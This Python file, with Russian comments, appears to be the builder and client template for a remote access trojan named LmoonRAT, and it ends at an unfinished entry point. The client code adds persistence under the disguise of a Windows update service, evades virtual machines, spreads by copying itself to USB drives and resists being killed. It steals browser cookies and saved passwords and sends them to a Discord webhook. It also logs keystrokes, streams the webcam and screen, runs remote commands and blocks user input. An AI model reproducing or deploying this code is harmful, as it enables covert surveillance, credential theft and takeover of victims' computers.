import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext, Menu, simpledialog
import os
import sys
import shutil
import subprocess
import json
import threading
import socket
import time
import platform
import winreg
import ctypes
import random
import psutil
from datetime import datetime
import base64
import tempfile
import webbrowser
from PIL import Image, ImageTk
import importlib.util
import uuid
import wave
import pyaudio
import cv2
import numpy as np
import mss
import io
import requests
import sqlite3
import browser_cookie3
import re
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from pynput import keyboard
import pyautogui
import zipfile
import py7zr
import sys
import traceback

# ========== АВТОМАТИЧЕСКАЯ УСТАНОВКА ЗАВИСИМОСТЕЙ ==========
def install_dependencies():
    """Автоматическая установка необходимых зависимостей"""
    dependencies = [
        'psutil', 
        'browser_cookie3', 
        'requests',
        'mss',
        'pynput',
        'pillow',
        'opencv-python-headless',
        'pyaudio',
        'numpy',
        'pycryptodome',
        'py7zr',
        'pyautogui',
        'kivy',
        'buildozer'
    ]
    
    print("[*] Проверка зависимостей...")
    
    for package in dependencies:
        try:
            spec = importlib.util.find_spec(package)
            if spec is None:
                print(f"[>] Установка {package}...")
                
                # Особые флаги для проблемных пакетов
                install_cmd = [sys.executable, "-m", "pip", "install"]
                if package == "psutil":
                    install_cmd.append("--only-binary=:all:")  # Использовать бинарные пакеты
                elif package == "opencv-python-headless":
                    install_cmd.append("opencv-python-headless")  # Легкая версия без GUI
                
                install_cmd.append(package)
                
                subprocess.check_call(install_cmd)
                print(f"[+] {package} успешно установлен")
            else:
                print(f"[+] {package} уже установлен")
        except Exception as e:
            print(f"[!] Ошибка установки {package}: {str(e)}")
            if package == "psutil":
                print("[!] Рекомендация: Установите Microsoft Visual C++ Build Tools")
                print("[!] Ссылка: https://visualstudio.microsoft.com/visual-cpp-build-tools/")

# Устанавливаем зависимости при запуске
install_dependencies()

# ========== КОНФИГ БИЛДЕРА ==========
BUILD_DIR = "C:\\LmoonRAT_Builds"
if not os.path.exists(BUILD_DIR):
    os.makedirs(BUILD_DIR)

# ========== ШАБЛОН КЛИЕНТА ==========
CLIENT_TEMPLATE = r'''
import sys
import os
import socket
import threading
import ctypes
import winreg
import subprocess
import platform
import json
from datetime import datetime
import base64
import tempfile
import time
import psutil
import requests
import sqlite3
import browser_cookie3
import shutil
import re
import uuid
import wave
import pyaudio
import cv2
import numpy as np
import mss
import io
import re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
from pynput import keyboard
import pyautogui
import random
import tkinter as tk
from tkinter import messagebox

# === КОНФИГУРАЦИЯ КЛИЕНТА ===
SAFE_MODE = {SAFE_MODE}          # Режим безопасного тестирования
DEBUG_MODE = {DEBUG_MODE}        # Режим отладки
PERSISTENT = {PERSISTENT}        # Постоянная установка
HIDE_FILE = {HIDE_FILE}          # Скрыть файл после запуска
ANTI_KILL = {ANTI_KILL}          # Блокировка завершения процесса
STEAL_COOKIES = {STEAL_COOKIES}  # Перехват cookies
STEAL_PASSWORDS = {STEAL_PASSWORDS} # Перехват паролей
ANTI_VM = {ANTI_VM}              # Обнаружение виртуальной машины
USB_SPREAD = {USB_SPREAD}        # Распространение через USB
DISCORD_WEBHOOK = "{DISCORD_WEBHOOK}" # Discord Webhook URL
ANTI_UNINSTALL = {ANTI_UNINSTALL} # Защита от удаления
FILE_EXTENSION = "{FILE_EXTENSION}" # Расширение файла
CAMERA_CAPTURE = {CAMERA_CAPTURE} # Захват с камеры
MICROPHONE_RECORD = {MICROPHONE_RECORD} # Запись с микрофона
ENCRYPT_COMMS = {ENCRYPT_COMMS}  # Шифрование коммуникации
ENCRYPT_KEY = b"{ENCRYPT_KEY}"   # Ключ шифрования
KEYLOGGER_ENABLED = {KEYLOGGER}  # Включение кейлоггера
FILE_TRANSFER = {FILE_TRANSFER}  # Передача файлов
ENABLE_PRANKS = {ENABLE_PRANKS}  # Включение приколов

# Константы для ctypes
DRIVE_REMOVABLE = 2
FILE_ATTRIBUTE_HIDDEN = 2

# Шифрование AES
def encrypt_data(data, key):
    """Шифрование данных с использованием AES"""
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    iv = cipher.iv
    return iv + ct_bytes

def decrypt_data(encrypted_data, key):
    """Дешифрование данных с использованием AES"""
    iv = encrypted_data[:16]
    ct = encrypted_data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt

def send_discord_webhook(content, file=None, filename=None):
    """Отправка данных в Discord через webhook"""
    if not DISCORD_WEBHOOK:
        return
        
    try:
        files = {}
        if file and filename:
            files = {'file': (filename, file)}
            
        payload = {"content": content}
        requests.post(DISCORD_WEBHOOK, data=payload, files=files, timeout=30)
    except:
        pass

def set_autostart():
    """Добавление в автозагрузку"""
    if not PERSISTENT:
        if DEBUG_MODE:
            print("[DEBUG] Автозагрузка отключена по настройкам")
        return
        
    try:
        # Основной метод - реестр
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, sys.executable)
            
        # Альтернативный метод - папка автозагрузки
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if os.path.exists(startup_path):
            target_path = os.path.join(startup_path, os.path.basename(sys.executable))
            if not os.path.exists(target_path):
                shutil.copyfile(sys.executable, target_path)
                if HIDE_FILE:
                    try:
                        ctypes.windll.kernel32.SetFileAttributesW(target_path, FILE_ATTRIBUTE_HIDDEN)
                    except:
                        pass
                    
        if DEBUG_MODE:
            print(f"[DEBUG] Добавлено в автозагрузку: {sys.executable}")
    except Exception as e:
        if DEBUG_MODE:
            print(f"[DEBUG] Ошибка автозагрузки: {str(e)}")

def hide_window():
    """Скрытие окна консоли"""
    if SAFE_MODE or DEBUG_MODE:
        print("[DEBUG] Режим скрытия окна отключен")
        return
        
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')
    hWnd = kernel32.GetConsoleWindow()
    if hWnd: 
        user32.ShowWindow(hWnd, 0)
        if DEBUG_MODE:
            print("[DEBUG] Окно скрыто")

def get_hwid():
    """Генерация уникального ID устройства"""
    try:
        hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
        return hwid if hwid else platform.node() + str(os.getpid())
    except:
        return platform.node() + str(os.getpid())

def safe_exit():
    """Безопасное самоудаление клиента"""
    try:
        # Удаление из автозагрузки
        try:
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.DeleteValue(key, "WindowsUpdateService")
        except:
            pass
        
        # Удаление из папки автозагрузки
        try:
            startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            target_path = os.path.join(startup_path, os.path.basename(sys.executable))
            if os.path.exists(target_path):
                os.remove(target_path)
        except:
            pass
        
        # Скрипт самоудаления
        bat_script = f"""
        @echo off
        timeout /t 3 /nobreak >nul
        del /f /q "{os.path.basename(sys.executable)}"
        del /f /q "%~f0"
        """
        
        # Сохраняем BAT-скрипт
        with open("uninstall.bat", "w") as f:
            f.write(bat_script)
            
        # Запускаем самоудаление
        subprocess.Popen("uninstall.bat", creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit(0)
        
    except Exception as e:
        if DEBUG_MODE:
            print(f"[DEBUG] Ошибка самоудаления: {str(e)}")

def anti_uninstall_protection():
    """Защита от удаления"""
    while ANTI_UNINSTALL and not SAFE_MODE:
        try:
            # Проверяем, существует ли файл
            if not os.path.exists(sys.executable):
                # Восстанавливаем файл из временной копии
                if os.path.exists(backup_path):
                    shutil.copyfile(backup_path, sys.executable)
                    subprocess.Popen([sys.executable], creationflags=subprocess.CREATE_NO_WINDOW)
                
            # Проверяем автозагрузку
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ) as key:
                value, _ = winreg.QueryValueEx(key, "WindowsUpdateService")
                if value != sys.executable:
                    set_autostart()
                    
        except Exception as e:
            if DEBUG_MODE:
                print(f"[DEBUG] Ошибка защиты: {str(e)}")
                
        time.sleep(60)

def is_virtual_machine():
    """Улучшенное определение виртуальной среды"""
    if SAFE_MODE or not ANTI_VM:
        return False
        
    try:
        # 1. Проверка по имени компьютера
        computer_name = platform.node().lower()
        vm_keywords = ['vmware', 'virtual', 'vbox', 'qemu', 'xen', 'docker', 'kvm', 'hyperv']
        if any(keyword in computer_name for keyword in vm_keywords):
            return True
            
        # 2. Проверка через системную информацию
        try:
            import wmi
            c = wmi.WMI()
            
            # Проверка BIOS
            for bios in c.Win32_BIOS():
                bios_info = (bios.SerialNumber or "").lower() + (bios.Version or "").lower()
                if any(keyword in bios_info for keyword in vm_keywords):
                    return True
            
            # Проверка модели
            for computer in c.Win32_ComputerSystem():
                if computer.Model is not None:
                    model = computer.Model.lower()
                    if any(keyword in model for keyword in vm_keywords):
                        return True
        except:
            pass
            
        # 3. Проверка оборудования
        try:
            # Проверка наличия драйверов VM
            vm_drivers = ["vmmouse", "vm3dmp", "vmusbmouse", "vmx_svga", "vmxnet"]
            for driver in vm_drivers:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, f"SYSTEM\\CurrentControlSet\\Services\\{driver}")
                    winreg.CloseKey(key)
                    return True
                except:
                    pass
        except:
            pass
        
        # 4. Проверка через MAC-адрес
        try:
            mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
            vm_mac_prefixes = ['00:05:69', '00:0C:29', '00:1C:14', '00:50:56', '08:00:27']
            if any(mac_address.startswith(prefix) for prefix in vm_mac_prefixes):
                    return True
        except:
            pass
            
        # 5. Проверка через процессор
        try:
            cpu_info = subprocess.check_output("wmic cpu get name", shell=True).decode().lower()
            if "vmware" in cpu_info or "virtual" in cpu_info:
                return True
        except:
            pass
            
    except Exception as e:
        if DEBUG_MODE:
            print(f"[DEBUG] VM check error: {str(e)}")
            
    return False

def spread_via_usb():
    """Распространение через USB-накопители с использованием ctypes"""
    if SAFE_MODE or not USB_SPREAD:
        return
        
    try:
        # Загружаем kernel32
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        
        # Определяем GetLogicalDriveStrings
        kernel32.GetLogicalDriveStringsW.argtypes = [ctypes.c_uint, ctypes.POINTER(ctypes.c_wchar)]
        kernel32.GetLogicalDriveStringsW.restype = ctypes.c_uint
        
        # Определяем GetDriveType
        kernel32.GetDriveTypeW.argtypes = [ctypes.c_wchar_p]
        kernel32.GetDriveTypeW.restype = ctypes.c_uint
        
        # Получаем список дисков
        buffer_size = 1024
        buffer = ctypes.create_unicode_buffer(buffer_size)
        length = kernel32.GetLogicalDriveStringsW(buffer_size - 1, buffer)
        
        if length == 0:
            return
            
        # Разбираем строку с дисками
        drives = buffer.value.split('\x00')[:-1]
        
        for drive in drives:
            try:
                drive_type = kernel32.GetDriveTypeW(drive)
                # DRIVE_REMOVABLE = 2
                if drive_type == 2:
                    target_path = os.path.join(drive, "WindowsUpdate.exe")
                    
                    # Если уже есть наша копия - пропускаем
                    if os.path.exists(target_path):
                        continue
                    
                    # Копируем себя
                    shutil.copyfile(sys.executable, target_path)
                    
                    # Устанавливаем скрытый атрибут
                    try:
                        kernel32.SetFileAttributesW(target_path, FILE_ATTRIBUTE_HIDDEN)
                    except:
                        pass
            except:
                pass
    except Exception as e:
        if DEBUG_MODE:
            print(f"[DEBUG] USB spread error: {str(e)}")

class LmoonClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.connection = None
        self.hwid = get_hwid()
        self.os_info = f"{platform.system()} {platform.release()}"
        self.join_date = datetime.now().strftime("%Y-%m-%d %H:%M")
        self.is_vm = is_virtual_machine()
        self.functions = {
            "cmd": self.execute_command,
            "download": self.download_file,
            "keylog": self.keylogger_control,
            "info": self.send_system_info,
            "uninstall": self.uninstall_client,
            "get_cookies": self.steal_cookies,
            "get_passwords": self.steal_passwords,
            "get_data": self.steal_all_data,
            "persist": self.enable_persistence,
            "usb_spread": self.enable_usb_spread,
            "camera": self.capture_camera,
            "monitor": self.stream_monitor,
            "upload": self.upload_file,
            "keylog": self.keylogger_control,
            "prank": self.handle_prank,
        }
        self.keylogger_active = False
        self.keylog = []
        self.keylogger_thread = None
        self.camera_active = False
        self.monitor_active = False
        self.microphone_active = False
        
        # Информация для безопасного режима
        if SAFE_MODE:
            print("="*60)
            print("ВНИМАНИЕ: Вы запустили RAT-клиент в безопасном режиме!")
            print("Этот клиент НЕ будет:")
            print("  - Скрывать свое окно")
            print("  - Добавляться в автозагрузку")
            print("  - Выполнять скрытые действия")
            print("Для остановки просто закройте это окно.")
            print("="*60)
            print(f"[SAFE] Параметры подключения: {host}:{port}")
        
    def connect(self):
        while True:
            try:
                if SAFE_MODE:
                    print(f"[SAFE] Попытка подключения к {self.host}:{self.port}")
                    
                # Создаем новый сокет для каждого соединения
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.settimeout(30)  # Таймаут 30 секунд
                self.connection.connect((self.host, self.port))
                
                if SAFE_MODE:
                    print("[SAFE] Успешное подключение к серверу")
                
                # Отправляем информацию о себе
                self.send_system_info()
                self.handle_connection()
            except socket.timeout:
                if SAFE_MODE:
                    print("[SAFE] Таймаут подключения")
                time.sleep(30)
            except ConnectionRefusedError:
                if SAFE_MODE:
                    print("[SAFE] Сервер недоступен")
                time.sleep(30)
            except socket.gaierror as e:
                if SAFE_MODE:
                    print(f"[SAFE] Ошибка DNS: {str(e)}")
                time.sleep(60)
            except Exception as e:
                if SAFE_MODE:
                    print(f"[SAFE] Ошибка подключения: {str(e)}")
                time.sleep(30)
            finally:
                # Закрываем соединение перед следующей попыткой
                if self.connection:
                    try:
                        self.connection.close()
                    except:
                        pass
                    self.connection = None
                
    def handle_connection(self):
        while True:
            try:
                data = self.connection.recv(4096)
                if not data: 
                    if SAFE_MODE:
                        print("[SAFE] Соединение разорвано сервером")
                    break
                
                # Расшифровка данных
                if ENCRYPT_COMMS:
                    try:
                        data = decrypt_data(data, ENCRYPT_KEY)
                    except:
                        if SAFE_MODE:
                            print("[SAFE] Ошибка дешифрования данных")
                        continue
                
                data = data.decode()
                
                if SAFE_MODE:
                    print(f"[SAFE] Получена команда: {data[:50]}...")
                
                cmd = data.split()[0]
                if cmd in self.functions:
                    self.functions[cmd](data)
            except ConnectionResetError:
                if SAFE_MODE:
                    print("[SAFE] Соединение разорвано сервером")
                break
            except Exception as e:
                if SAFE_MODE:
                    print(f"[SAFE] Ошибка обработки: {str(e)}")
                break
    
    def send_data(self, data):
        """Отправка данных с возможным шифрованием"""
        if isinstance(data, str):
            data = data.encode()
            
        if ENCRYPT_COMMS:
            data = encrypt_data(data, ENCRYPT_KEY)
            
        try:
            self.connection.send(data)
        except:
            if SAFE_MODE:
                print("[SAFE] Ошибка отправки данных")
    
    def send_system_info(self, _=None):
        info = {
            "hwid": self.hwid,
            "os": self.os_info,
            "join_date": self.join_date,
            "status": "online",
            "ip": socket.gethostbyname(socket.gethostname()),
            "safe_mode": SAFE_MODE,
            "is_vm": self.is_vm
        }
        try:
            self.send_data(json.dumps(info))
        except:
            if SAFE_MODE:
                print("[SAFE] Ошибка отправки системной информации")
    
    # Основные функции
    def execute_command(self, data):
        cmd = ' '.join(data.split()[1:])
        
        if SAFE_MODE:
            print(f"[SAFE] Выполнение команды: {cmd}")
        
        try:
            result = subprocess.getoutput(cmd)
            self.send_data(result)
        except:
            self.send_data(b"Command execution error")
        
    def download_file(self, data):
        filepath = data.split()[1]
        if SAFE_MODE:
            print(f"[SAFE] Запрос файла: {filepath}")
            
        if os.path.exists(filepath):
            try:
                with open(filepath, 'rb') as f:
                    self.send_data(base64.b64encode(f.read()))
            except:
                self.send_data(b"File read error")
        else:
            self.send_data(b"File not found")
    
    def start_keylogger(self):
        """Запуск кейлоггера"""
        if self.keylogger_active:
            return
            
        self.keylog = []
        self.keylogger_active = True
        self.keylogger_thread = threading.Thread(target=self.keylogger_thread_func, daemon=True)
        self.keylogger_thread.start()
        if DEBUG_MODE:
            print("[DEBUG] Keylogger started")

    def keylogger_thread_func(self):
        """Поток для записи нажатий клавиш"""
        def on_press(key):
            try:
                self.keylog.append(str(key.char))
            except AttributeError:
                special_keys = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n',
                    keyboard.Key.backspace: '[BACKSPACE]',
                    keyboard.Key.tab: '[TAB]',
                    keyboard.Key.esc: '[ESC]',
                }
                self.keylog.append(special_keys.get(key, f'[{key}]'))
        
        with keyboard.Listener(on_press=on_press) as listener:
            while self.keylogger_active:
                time.sleep(0.1)
            listener.stop()

    def stop_keylogger(self):
        """Остановка кейлоггера"""
        self.keylogger_active = False
        if self.keylogger_thread:
            self.keylogger_thread.join(timeout=2)
        self.keylogger_thread = None
        if DEBUG_MODE:
            print("[DEBUG] Keylogger stopped")

    def send_keylogger_data(self):
        """Отправка данных кейлоггера"""
        log_text = ''.join(self.keylog)
        self.keylog = []
        self.send_data(log_text.encode())
        if DEBUG_MODE:
            print("[DEBUG] Keylogger data sent")

    def keylogger_control(self, data):
        """Управление кейлоггером"""
        cmd = data.split()[1]
        if cmd == "start":
            self.start_keylogger()
            self.send_data(b"Keylogger started")
        elif cmd == "stop":
            self.stop_keylogger()
            self.send_data(b"Keylogger stopped")
        elif cmd == "dump":
            self.send_keylogger_data()
        else:
            self.send_data(b"Invalid keylogger command")
    
    def uninstall_client(self, _):
        """Самоудаление клиента по команде сервера"""
        if SAFE_MODE:
            print("[SAFE] Получена команда на самоудаление")
            
        try:
            self.send_data(b"Uninstalling client...")
        except:
            pass
        safe_exit()
        
    def steal_cookies(self, _):
        """Кража cookies браузеров"""
        if SAFE_MODE: 
            try:
                self.send_data(b"Safe mode: cookies not stolen")
            except:
                pass
            return
            
        try:
            cookies_data = ""
            browsers = [
                browser_cookie3.chrome,
                browser_cookie3.firefox,
                browser_cookie3.edge,
                browser_cookie3.opera,
                browser_cookie3.brave
            ]
            
            for browser_fn in browsers:
                try:
                    for cookie in browser_fn(domain_name=''):
                        cookies_data += f"{cookie.domain}\tTRUE\t{cookie.path}\t{cookie.secure}\t{cookie.expires}\t{cookie.name}\t{cookie.value}\n"
                except Exception as e:
                    if DEBUG_MODE:
                        print(f"[DEBUG] Ошибка сбора cookies: {str(e)}")
            
            # Отправка в Discord
            if DISCORD_WEBHOOK and cookies_data:
                send_discord_webhook(f"Cookies from {self.hwid}", cookies_data.encode(), "cookies.txt")
                self.send_data(b"Cookies sent to Discord")
            else:
                self.send_data(cookies_data.encode())
        except ImportError:
            self.send_data(b"Cookie module not installed")
        except Exception as e:
            self.send_data(f"Cookie error: {str(e)}".encode())
            
    def steal_passwords(self, _):
        """Кража паролей из браузеров"""
        if SAFE_MODE: 
            try:
                self.send_data(b"Safe mode: passwords not stolen")
            except:
                pass
            return
            
        try:
            passwords_data = ""
            # Chrome
            try:
                login_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
                if os.path.exists(login_db):
                    shutil.copy2(login_db, "chrome_data.db")
                    conn = sqlite3.connect("chrome_data.db")
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        url = row[0]
                        username = row[1]
                        encrypted_password = row[2]
                        passwords_data += f"URL: {url}\nUser: {username}\nPass: {encrypted_password}\n\n"
                    conn.close()
                    os.remove("chrome_data.db")
            except Exception as e:
                if DEBUG_MODE:
                    print(f"[DEBUG] Ошибка сбора паролей Chrome: {str(e)}")
            
            # Firefox
            try:
                profiles_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
                if os.path.exists(profiles_path):
                    for profile in os.listdir(profiles_path):
                        if profile.endswith('.default-release'):
                            db_path = os.path.join(profiles_path, profile, 'logins.json')
                            if os.path.exists(db_path):
                                with open(db_path, 'r', encoding='utf-8') as f:
                                    data = json.load(f)
                                    for login in data.get('logins', []):
                                        passwords_data += f"URL: {login.get('hostname', '')}\nUser: {login.get('encryptedUsername', '')}\nPass: {login.get('encryptedPassword', '')}\n\n"
            except Exception as e:
                if DEBUG_MODE:
                    print(f"[DEBUG] Ошибка сбора паролей Firefox: {str(e)}")
            
            # Отправка в Discord
            if DISCORD_WEBHOOK and passwords_data:
                send_discord_webhook(f"Passwords from {self.hwid}", passwords_data.encode(), "passwords.txt")
                self.send_data(b"Passwords sent to Discord")
            else:
                self.send_data(passwords_data.encode())
        except Exception as e:
            self.send_data(f"Password error: {str(e)}".encode())
    
    def steal_all_data(self, _):
        """Кража всех данных (cookies + passwords)"""
        self.steal_cookies(_)
        time.sleep(1)
        self.steal_passwords(_)
    
    def enable_persistence(self, _):
        """Включение постоянной установки по команде"""
        if SAFE_MODE:
            self.send_data(b"Cannot enable persistence in safe mode")
            return
            
        try:
            set_autostart()
            self.send_data(b"Persistence enabled successfully")
        except Exception as e:
            self.send_data(f"Persistence error: {str(e)}".encode())
            
    def enable_usb_spread(self, _):
        """Включение USB-распространения по команде"""
        if SAFE_MODE:
            self.send_data(b"Cannot enable USB spread in safe mode")
            return
            
        try:
            threading.Thread(target=spread_via_usb, daemon=True).start()
            self.send_data(b"USB spread enabled successfully")
        except Exception as e:
            self.send_data(f"USB spread error: {str(e)}".encode())
    
    def capture_camera(self, _):
        """Потоковая передача с камеры"""
        if SAFE_MODE: 
            try:
                self.send_data(b"Safe mode: camera streaming disabled")
            except:
                pass
            return
            
        try:
            # Открываем камеру
            self.camera_active = True
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                self.send_data(b"Camera not available")
                return
                
            # Устанавливаем разрешение
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            
            while self.camera_active:
                # Читаем кадр
                ret, frame = cap.read()
                if not ret:
                    break
                    
                # Конвертируем в JPEG
                ret, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                if not ret:
                    continue
                    
                img_bytes = buffer.tobytes()
                
                # Отправляем данные
                self.send_data(img_bytes)
                
            cap.release()
            self.send_data(b"Camera streaming stopped")
        except Exception as e:
            self.send_data(f"Camera error: {str(e)}".encode())
        finally:
            self.camera_active = False
    
    def stop_camera(self):
        """Остановка потока камеры"""
        self.camera_active = False
    
    def stream_monitor(self, _):
        """Трансляция экрана в реальном времени"""
        if SAFE_MODE: 
            try:
                self.send_data(b"Safe mode: monitor streaming disabled")
            except:
                pass
            return
            
        try:
            self.monitor_active = True
            with mss.mss() as sct:
                monitor = sct.monitors[1]  # Основной монитор
                
                # Параметры сжатия
                quality = 50  # Качество JPEG (0-100)
                
                while self.monitor_active:
                    # Захват экрана
                    sct_img = sct.grab(monitor)
                    
                    # Конвертируем в изображение
                    img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                    
                    # Конвертируем в JPEG
                    buffer = io.BytesIO()
                    img.save(buffer, format="JPEG", quality=quality)
                    img_bytes = buffer.getvalue()
                    
                    # Отправляем данные
                    self.send_data(img_bytes)
                    
                    # Задержка для снижения нагрузки
                    time.sleep(0.1)
                    
        except Exception as e:
            self.send_data(f"Monitor error: {str(e)}".encode())
        finally:
            self.monitor_active = False
    
    def stop_monitor(self):
        """Остановка трансляции экрана"""
        self.monitor_active = False
    
    def upload_file(self, data):
        """Загрузка файла на клиент"""
        parts = data.split(maxsplit=2)
        if len(parts) < 3:
            return
            
        filename = parts[1]
        file_data = base64.b64decode(parts[2])
        
        try:
            with open(filename, 'wb') as f:
                f.write(file_data)
            self.send_data(f"File uploaded: {filename}".encode())
        except Exception as e:
            self.send_data(f"Upload error: {str(e)}".encode())
    
    def anti_kill_thread(self):
        """Защита от завершения процесса"""
        while ANTI_KILL and not SAFE_MODE:
            try:
                # Повышаем приоритет процесса
                current_pid = os.getpid()
                process = psutil.Process(current_pid)
                if platform.system() == 'Windows':
                    process.nice(psutil.HIGH_PRIORITY_CLASS)
                else:
                    process.nice(-10)
                    
                # Проверяем, не пытаются ли завершить процесс
                for proc in psutil.process_iter():
                    try:
                        if "taskkill" in proc.name().lower() and str(current_pid) in " ".join(proc.cmdline()):
                            proc.kill()
                    except:
                        pass
            except:
                pass
            time.sleep(30)
    
    # ========== ФУНКЦИИ ПРИКОЛОВ ==========
    def prank_invert_screen(self):
        """Инверсия цветов экрана"""
        if SAFE_MODE or not ENABLE_PRANKS:
            return
            
        try:
            # Создаем полноэкранное окно с инверсией цветов
            root = tk.Tk()
            root.attributes("-fullscreen", True)
            root.attributes("-topmost", True)
            
            # Инвертируем цвета
            canvas = tk.Canvas(root, bg='black', highlightthickness=0)
            canvas.pack(fill=tk.BOTH, expand=True)
            
            # Захватываем скриншот
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                sct_img = sct.grab(monitor)
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                img = img.convert("L")  # Инвертируем цвета
                
                # Конвертируем в Tkinter-совместимый формат
                photo = ImageTk.PhotoImage(img)
            
            # Отображаем инвертированный скриншот
            canvas.create_image(0, 0, image=photo, anchor=tk.NW)
            
            # Закрываем через 10 секунд
            root.after(10000, root.destroy)
            root.mainloop()
        except:
            pass

    def prank_rotate_screen(self, angle=90):
        """Поворот экрана"""
        if SAFE_MODE or not ENABLE_PRANKS:
            return
            
        try:
            # Определение ориентации
            orientations = {
                0: 0,    # Default
                90: 3,   # 90 degrees
                180: 2,  # 180 degrees
                270: 1   # 270 degrees
            }
            
            # Поворачиваем основной дисплей
            device = ctypes.c_void_p(None)
            ctypes.windll.user32.EnumDisplayDevicesA(None, 0, ctypes.byref(device), 0)
            
            dm = win32api.EnumDisplaySettings(device.DeviceName, -1)
            dm.DisplayOrientation = orientations.get(angle, 0)
            win32api.ChangeDisplaySettingsEx(device.DeviceName, dm)
        except:
            pass

    def prank_fake_bsod(self):
        """Фейковый синий экран смерти"""
        if SAFE_MODE or not ENABLE_PRANKS:
            return
            
        try:
            # Создаем полноэкранное окно синего цвета
            bsod_window = tk.Tk()
            bsod_window.attributes("-fullscreen", True)
            bsod_window.configure(bg="#0078D7")
            
            # Добавляем текст ошибки
            error_text = (
                ":( Ваш ПК столкнулся с проблемой и нуждается в перезагрузке.\n\n"
                "Мы просто собираем некоторые данные об ошибке, а затем автоматически перезагрузим компьютер.\n\n"
                "100% завершено\n\n"
                "Для получения дополнительной информации об этой ошибке и возможных исправлениях посетите:\n"
                "https://windows.com/stopcode"
            )
            
            tk.Label(
                bsod_window, 
                text=error_text, 
                bg="#0078D7", 
                fg="white", 
                font=("Segoe UI", 20),
                justify=tk.LEFT
            ).pack(expand=True, padx=100, pady=100)
            
            # Задержка перед закрытием
            bsod_window.after(10000, bsod_window.destroy)
            bsod_window.mainloop()
        except:
            pass

    def prank_disable_keyboard(self, seconds=30):
        """Временное отключение клавиатуры"""
        if SAFE_MODE or not ENABLE_PRANKS:
            return
            
        def block_keyboard():
            # Блокируем клавиатуру
            ctypes.windll.user32.BlockInput(True)
            time.sleep(seconds)
            ctypes.windll.user32.BlockInput(False)
        
        threading.Thread(target=block_keyboard, daemon=True).start()

    def prank_mouse_jiggler(self, duration=60):
        """Случайное движение мыши"""
        if SAFE_MODE or not ENABLE_PRANKS:
            return
            
        def jiggle():
            start_time = time.time()
            while time.time() - start_time < duration:
                x = random.randint(-50, 50)
                y = random.randint(-50, 50)
                pyautogui.move(x, y)
                time.sleep(0.5)
        
        threading.Thread(target=jiggle, daemon=True).start()

    def prank_annoying_popup(self, count=10):
        """Надоедливые всплывающие окна"""
        if SAFE_MODE or not ENABLE_PRANKS:
            return
            
        def show_popups():
            messages = [
                "Ваш компьютер заражен!",
                "Обнаружен вирус!",
                "Системная ошибка!",
                "Требуется немедленное действие!",
                "Файлы повреждены!",
                "Внимание: критическая ошибка!",
                "Ваша система уязвима!",
                "Обнаружена подозрительная активность!",
                "Требуется обновление безопасности!",
                "Внимание: ваши данные в опасности!"
            ]
            
            for _ in range(count):
                threading.Thread(
                    target=messagebox.showerror,
                    args=("ОШИБКА СИСТЕМЫ", random.choice(messages))
                ).start()
                time.sleep(0.5)
        
        threading.Thread(target=show_popups, daemon=True).start()

    def prank_play_sound(self):
        """Проигрывание случайного звука"""
        if SAFE_MODE or not ENABLE_PRANKS:
            return
            
        try:
            sounds = [
                "SystemExclamation", "SystemHand", "SystemQuestion",
                "SystemStart", "SystemExit", "SystemAsterisk"
            ]
            ctypes.windll.user32.MessageBeep(0xFFFFFFFF)
            ctypes.windll.winmm.PlaySoundW(random.choice(sounds), None, 0x0001)
        except:
            pass

    def handle_prank(self, data):
        """Обработка команд приколов"""
        prank_type = data.split()[1]
        
        if prank_type == "invert_screen":
            self.prank_invert_screen()
        elif prank_type == "rotate_screen":
            self.prank_rotate_screen(random.choice([90, 180, 270]))
        elif prank_type == "fake_bsod":
            self.prank_fake_bsod()
        elif prank_type == "disable_keyboard":
            self.prank_disable_keyboard(30)
        elif prank_type == "mouse_jiggler":
            self.prank_mouse_jiggler(60)
        elif prank_type == "annoying_popup":
            self.prank_annoying_popup(15)
        elif prank_type == "play_sound":
            self.prank_play_sound()

# Точка входа
if __name__ == "__main__":
    # Проверка безопасного режима
